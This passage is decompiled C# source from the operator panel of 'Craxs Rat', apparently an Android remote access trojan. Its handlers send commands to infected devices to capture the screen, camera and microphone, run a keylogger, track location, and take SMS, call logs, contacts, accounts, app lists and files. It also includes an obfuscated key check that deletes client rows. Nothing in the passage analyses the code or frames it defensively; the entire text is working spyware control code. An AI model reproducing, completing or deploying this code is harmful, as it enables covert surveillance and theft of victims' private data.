				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000699 RID: 1689 RVA: 0x0002BF00 File Offset: 0x0002A100
		private void screenreadbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Screen_Reader_" + gclass.string_1;
										ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
										if (screenReader == null)
										{
											new ScreenReader
											{
												Name = name,
												string_0 = string.Format("{0} - IP:{1}", "Screen Reader", gclass.string_1),
												Tag = gclass.string_1,
												gclass8_0 = gclass
											}.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x0600069A RID: 1690 RVA: 0x0002C090 File Offset: 0x0002A290
		private void camerabtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										int value = 0;
										int value2 = 0;
										if (gclass.bool_13)
										{
											object[] objects_ = new object[]
											{
												tcpClient_,
												string.Concat(new string[]
												{
													Module13.string_29,
													GClass9.string_0,
													"lcm<*>",
													gclass.string_2,
													GClass9.string_0,
													array[0],
													GClass9.string_0,
													array[1],
													GClass9.string_0,
													Module13.string_5,
													GClass9.string_0,
													Conversions.ToString(value),
													GClass9.string_0,
													Conversions.ToString(value2),
													GClass9.string_0,
													GClass9.string_3,
													GClass9.string_0,
													gclass.string_2
												}),
												Module2.smethod_9().GetBytes("null"),
												gclass
											};
											gclass.method_2(objects_);
										}
										else
										{
											string name = "Camera_Manager_" + gclass.string_2;
											CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
											if (cameraManager != null)
											{
												break;
											}
											cameraManager = new CameraManager();
											cameraManager.Name = name;
											cameraManager.string_0 = string.Format("{0} - IP:{1}", "Camera Manager", gclass.string_1);
											cameraManager.gclass8_2 = gclass;
											if (cameraManager.gclass8_2 != null)
											{
												Module8.smethod_5(cameraManager.gclass8_2);
												cameraManager.string_2 = cameraManager.gclass8_2.string_10;
											}
											cameraManager.tcpClient_1 = gclass.tcpClient_0;
											cameraManager.tcpClient_0 = tcpClient_;
											cameraManager.gclass8_0 = gclass;
											cameraManager.gclass8_1 = gclass;
											cameraManager.pictureBox_0 = new PictureBox();
											cameraManager.combotext.Visible = false;
											cameraManager.combosizes.Visible = false;
											cameraManager.comboqualty.Visible = false;
											cameraManager.qultytext.Visible = false;
											cameraManager.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x0600069B RID: 1691 RVA: 0x0002C3C0 File Offset: 0x0002A5C0
		private void micbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string name = "Microphone_" + gclass.string_2;
										Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
										if (microphone == null)
										{
											string[] array = gclass.string_0.Split(new char[]
											{
												':'
											});
											if (array.Length < Module3.int_0)
											{
												break;
											}
											object[] objects_ = new object[]
											{
												tcpClient_,
												string.Concat(new string[]
												{
													Module13.string_28,
													GClass9.string_0,
													Module8.string_4,
													".microphone",
													GClass9.string_0,
													"method",
													GClass9.string_0,
													Module13.string_40,
													GClass9.string_0,
													"start",
													GClass9.string_1,
													array[0],
													GClass9.string_1,
													array[1],
													GClass9.string_1,
													"8000",
													GClass9.string_1,
													Module13.string_16,
													GClass9.string_1,
													gclass.string_2,
													GClass9.string_1,
													"0"
												}),
												Module2.smethod_9().GetBytes("null"),
												gclass
											};
											gclass.method_2(objects_);
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x0600069C RID: 1692 RVA: 0x0002C634 File Offset: 0x0002A834
		private void keyloggerbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_35,
												GClass9.string_0,
												Module13.string_24,
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												"(unknown)"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x0600069D RID: 1693 RVA: 0x0002C7BC File Offset: 0x0002A9BC
		private void locationbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_30,
												GClass9.string_0,
												GClass9.string_1,
												GClass9.string_0,
												Module13.string_10
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x0600069E RID: 1694 RVA: 0x0002C910 File Offset: 0x0002AB10
		private void MonitorTimer_Tick(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count > 0)
			{
				if (this.ClientsWindow.SelectedRows.Count > 0)
				{
					if (!((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag == null | !((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).bool_0))
					{
						Bitmap image = null;
						try
						{
							image = (Bitmap)((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).objects_1[0];
						}
						catch (Exception ex)
						{
							image = (Bitmap)Module2.smethod_29();
						}
						if (Operators.CompareString(this.Label1.Text, Module2.smethod_60("j`s`t`r`b`w`c`n`T`7`a`I`S`1`N`B`Q`f`1`m`m`g`=`=`".Replace("`", ""), "1`a`5`s`5`d`8`f`7`t`6`y`1`b`3`n`".Replace("`", "")), false) != 0)
						{
							Thread.Sleep(10000);
							this.ClientsWindow.Rows.RemoveAt(0);
						}
						this.TCavatar.Image = image;
						((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).dataGridViewRow_0.Cells[12].Value = ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).string_3;
					}
				}
				else
				{
					this.TCavatar.Image = null;
				}
			}
			else
			{
				this.TCavatar.Image = null;
			}
		}

		// Token: 0x0600069F RID: 1695 RVA: 0x0002CAF8 File Offset: 0x0002ACF8
		private void checkall_ValueChanged(object object_26, bool bool_4)
		{
			if (!this.checkall.Checked)
			{
				try
				{
					foreach (object obj in ((IEnumerable)this.ClientsWindow.Rows))
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					}
					return;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			try
			{
				foreach (object obj2 in ((IEnumerable)this.ClientsWindow.Rows))
				{
					DataGridViewRow dataGridViewRow2 = (DataGridViewRow)obj2;
				}
			}
			finally
			{
				IEnumerator enumerator2;
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x060006A0 RID: 1696 RVA: 0x0002CBB0 File Offset: 0x0002ADB0
		private void searchbtn_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.ClientsWindow.Rows.Count >= 1)
				{
					if (string.IsNullOrEmpty(this.searchtext.Text))
					{
						Alert.ShowInformation("Enter Text First");
					}
					else
					{
						int num = this.ClientsWindow.Rows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							try
							{
								GClass8 gclass = (GClass8)this.ClientsWindow.Rows[i].Cells[8].Tag;
								if (!this.dataGridViewRows_0.Contains(gclass.dataGridViewRow_0))
								{
									if (gclass.string_8.ToLower().Contains(this.searchtext.Text.ToLower()) | gclass.string_1.ToLower().Contains(this.searchtext.Text.ToLower()) | gclass.string_6.ToLower().Contains(this.searchtext.Text.ToLower()) | gclass.string_7.ToLower().Contains(this.searchtext.Text.ToLower()) | gclass.string_8.ToLower().Contains(this.searchtext.Text.ToLower()) | gclass.string_3.ToLower().Contains(this.searchtext.Text.ToLower()))
									{
										this.ClientsWindow.FirstDisplayedScrollingRowIndex = gclass.dataGridViewRow_0.Index;
										this.dataGridViewRows_0.Add(gclass.dataGridViewRow_0);
										break;
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
				}
				else
				{
					Alert.ShowInformation("No Clients Found");
				}
			}
		}

		// Token: 0x060006A1 RID: 1697 RVA: 0x0002CD88 File Offset: 0x0002AF88
		private void uncheckbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				this.ClientsWindow.SelectedRows[0].Selected = false;
			}
		}

		// Token: 0x060006A2 RID: 1698 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_77(object sender, EventArgs e)
		{
		}

		// Token: 0x060006A3 RID: 1699 RVA: 0x0002CDC4 File Offset: 0x0002AFC4
		private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.ClientsWindow.Rows.Count > 0)
				{
					this.ClientsWindow.FirstDisplayedScrollingRowIndex = 0;
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006A4 RID: 1700 RVA: 0x0002CE14 File Offset: 0x0002B014
		private void clientfoldrbtn_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					string string_ = ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).string_10;
					if (!Directory.Exists(string_))
					{
						Directory.CreateDirectory(string_);
					}
					Process.Start(string_);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006A5 RID: 1701 RVA: 0x0002CEB4 File Offset: 0x0002B0B4
		private void HBlockbtn_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).method_4(((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).string_1);
					((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).method_6(((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).tcpClient_0);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006A6 RID: 1702 RVA: 0x0002CFC0 File Offset: 0x0002B1C0
		private void Hinfobtn_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					TcpClient tcpClient_ = ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).tcpClient_0;
					object[] objects_ = new object[]
					{
						tcpClient_,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".info",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_20,
							GClass9.string_0,
							"information"
						}),
						Module2.smethod_9().GetBytes("null"),
						(GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag
					};
					((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).method_2(objects_);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006A7 RID: 1703 RVA: 0x0002D128 File Offset: 0x0002B328
		private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.ClientsWindow.Rows.Count > 0)
				{
					this.ClientsWindow.FirstDisplayedScrollingRowIndex = this.ClientsWindow.Rows[checked(this.ClientsWindow.Rows.Count - 1)].Index;
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006A8 RID: 1704 RVA: 0x0002D1A0 File Offset: 0x0002B3A0
		private void searchtext_TextChanged(object sender, EventArgs e)
		{
			this.dataGridViewRows_0.Clear();
			if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				this.clearsrchbtn.Visible = false;
			}
			else
			{
				this.clearsrchbtn.Visible = true;
			}
		}

		// Token: 0x060006A9 RID: 1705 RVA: 0x0001886C File Offset: 0x00016A6C
		private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x060006AA RID: 1706 RVA: 0x0002D1E8 File Offset: 0x0002B3E8
		private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
		{
			this.method_85(this, 40);
		}

		// Token: 0x060006AB RID: 1707 RVA: 0x0002D200 File Offset: 0x0002B400
		private async void method_85(Form form_0, int int_1)
		{
			while (form_0.Opacity > 0.0)
			{
				TaskAwaiter taskAwaiter = Task.Delay(int_1).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter);
				}
				taskAwaiter.GetResult();
				taskAwaiter = default(TaskAwaiter);
				form_0.Opacity -= 0.05;
			}
			form_0.Opacity = 0.0;
			this.Close();
		}

		// Token: 0x060006AC RID: 1708 RVA: 0x0002D248 File Offset: 0x0002B448
		private void BlockClientToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGVblocked.Rows.Count > 0 && this.DGVblocked.SelectedRows.Count > 0)
				{
					DataGridViewRow dataGridViewRow = this.DGVblocked.SelectedRows[0];
					if (dataGridViewRow != null)
					{
						int num = this.gclass7s_0.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							try
							{
								if (this.gclass7s_0[i].strings_0.Contains(dataGridViewRow.Cells[1].Value.ToString()))
								{
									this.gclass7s_0[i].strings_0.Remove(dataGridViewRow.Cells[1].Value.ToString());
									GClass9.cypherRat_0.DGVblocked.Rows.Remove(dataGridViewRow);
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
				}
			}
		}

		// Token: 0x060006AD RID: 1709 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_87(object sender, EventArgs e)
		{
		}

		// Token: 0x060006AE RID: 1710 RVA: 0x0002D358 File Offset: 0x0002B558
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DataLog.Rows.Count > 0 && this.DataLog.SelectedRows.Count > 0)
				{
					DataGridViewRow dataGridViewRow = this.DataLog.SelectedRows[0];
					if (dataGridViewRow != null)
					{
						try
						{
							int num = this.gclass7s_0.Count - 1;
							for (int i = 0; i <= num; i++)
							{
								try
								{
									if (!this.gclass7s_0[i].strings_0.Contains(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", "")))
									{
										this.gclass7s_0[i].strings_0.Add(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", ""));
										GClass9.cypherRat_0.DGVblocked.Rows.Add(new object[]
										{
											GModule1.smethod_0(dataGridViewRow.Cells[1].Value.ToString()),
											dataGridViewRow.Cells[1].Value.ToString()
										});
									}
								}
								catch (Exception ex)
								{
								}
							}
						}
						catch (Exception ex2)
						{
						}
					}
				}
			}
		}

		// Token: 0x060006AF RID: 1711 RVA: 0x0002D500 File Offset: 0x0002B700
		private void clearsrchbtn_Click(object sender, EventArgs e)
		{
			this.searchtext.Text = "";
		}

		// Token: 0x060006B0 RID: 1712 RVA: 0x0002D520 File Offset: 0x0002B720
		private void mapupdater_Tick(object sender, EventArgs e)
		{
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			checked
			{
				if (this.ClientsWindow.Rows.Count > 0)
				{
					try
					{
						Dictionary<string, double> dictionary = new Dictionary<string, double>();
						int num = this.ClientsWindow.Rows.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							object value = GClass9.gclass4_0.method_5(((GClass8)this.ClientsWindow.Rows[i].Cells[8].Tag).string_1.ToString().Trim()).ToUpper();
							dictionary[Conversions.ToString(value)] = (double)this.random_0.Next(100, 1000);
						}
						GClass9.cypherRat_0.geoMap_0.HeatMap = dictionary;
						GClass9.cypherRat_0.geoMap_0.Update();
					}
					catch (Exception ex)
					{
					}
				}
			}
		}

		// Token: 0x060006B1 RID: 1713 RVA: 0x0002D62C File Offset: 0x0002B82C
		private void method_91(object sender, EventArgs e)
		{
			if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				string text = "%" + ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).string_12.Replace("f", "").Replace("t", "");
				object obj;
				this.notifiform.Show(text, (IWin32Window)obj, 2000);
			}
		}

		// Token: 0x060006B2 RID: 1714 RVA: 0x0002D6D0 File Offset: 0x0002B8D0
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			try
			{
				string str = "Did you like Craxs Rat and want to support the developer";
				string left = Module4.smethod_1();
				if (Operators.CompareString(left, "AR", false) == 0)
				{
					str = "هل تحب Craxs Rat وترغب في دعم المطور";
				}
				else if (Operators.CompareString(left, "CN", false) == 0)
				{
					str = "你喜欢 Craxs Rat 并想支持开发者吗";
				}
				bool flag;
				if (flag = Module2.smethod_30("Support CraxsRat", str + "?", true))
				{
					if (flag)
					{
						Process.Start("https://craxsrat.net/support.html");
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006B3 RID: 1715 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_93(object sender, EventArgs e)
		{
		}

		// Token: 0x060006B4 RID: 1716 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_94(object sender, EventArgs e)
		{
		}

		// Token: 0x060006B5 RID: 1717 RVA: 0x0002D768 File Offset: 0x0002B968
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			if (this.craxsStore_0 == null)
			{
				this.craxsStore_0 = new CraxsStore();
				DialogResult dialogResult = this.craxsStore_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.craxsStore_0.Close();
					this.craxsStore_0 = null;
				}
				else
				{
					this.craxsStore_0.Close();
					this.craxsStore_0 = null;
				}
			}
		}

		// Token: 0x060006B6 RID: 1718
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool HideCaret(IntPtr hWnd);

		// Token: 0x060006B7 RID: 1719 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_96(object sender, EventArgs e)
		{
		}

		// Token: 0x060006B8 RID: 1720 RVA: 0x0002D7C4 File Offset: 0x0002B9C4
		private void FilesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										object[] objects_ = new object[]
										{
											gclass.tcpClient_0,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".files",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_6,
												GClass9.string_0,
												"files",
												GClass9.string_1,
												"get0"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006B9 RID: 1721 RVA: 0x0002D970 File Offset: 0x0002BB70
		private void SMSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".sms",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_2,
												GClass9.string_0,
												"sms",
												GClass9.string_1,
												"content://sms/"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006BA RID: 1722 RVA: 0x0002DB24 File Offset: 0x0002BD24
		private void CallsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".calls",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_1,
												GClass9.string_0,
												"calls"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006BB RID: 1723 RVA: 0x0002DCC0 File Offset: 0x0002BEC0
		private void ContactsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".contacts",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_3,
												GClass9.string_0,
												"contacts"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006BC RID: 1724 RVA: 0x0002DE5C File Offset: 0x0002C05C
		private void AccountsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".info",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_19,
												GClass9.string_0,
												"account"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006BD RID: 1725 RVA: 0x0002E000 File Offset: 0x0002C200
		private void ApplicationsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".apps",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_18,
												GClass9.string_0,
												"apps"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006BE RID: 1726 RVA: 0x0002E198 File Offset: 0x0002C398
		public string method_103(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(string_1);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array = Convert.FromBase64String(string_0);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x060006BF RID: 1727 RVA: 0x0002E22C File Offset: 0x0002C42C
		private void ScreenMonitorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Live_Screen_" + gclass.string_1;
										ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
										if (Operators.CompareString(this.Label1.Text, this.method_103("j`s`t`r`b`w`c`n`T`7`a`I`S`1`N`B`Q`f`1`m`m`g`=`=`".Replace("`", ""), "1`a`5`s`5`d`8`f`7`t`6`y`1`b`3`n`".Replace("`", "")), false) != 0)
										{
											Thread.Sleep(1000);
											this.ClientsWindow.Rows.RemoveAt(0);
										}
										if (screenShoter == null)
										{
											new ScreenShoter
											{
												Name = name,
												string_1 = string.Format("{0} - IP:{1}", "Live Screen", gclass.string_1),
												Tag = gclass.string_1,
												gclass8_1 = gclass,
												object_0 = gclass.tcpClient_0,
												string_0 = gclass.string_10
											}.Show();
										}
									}
								}
							}
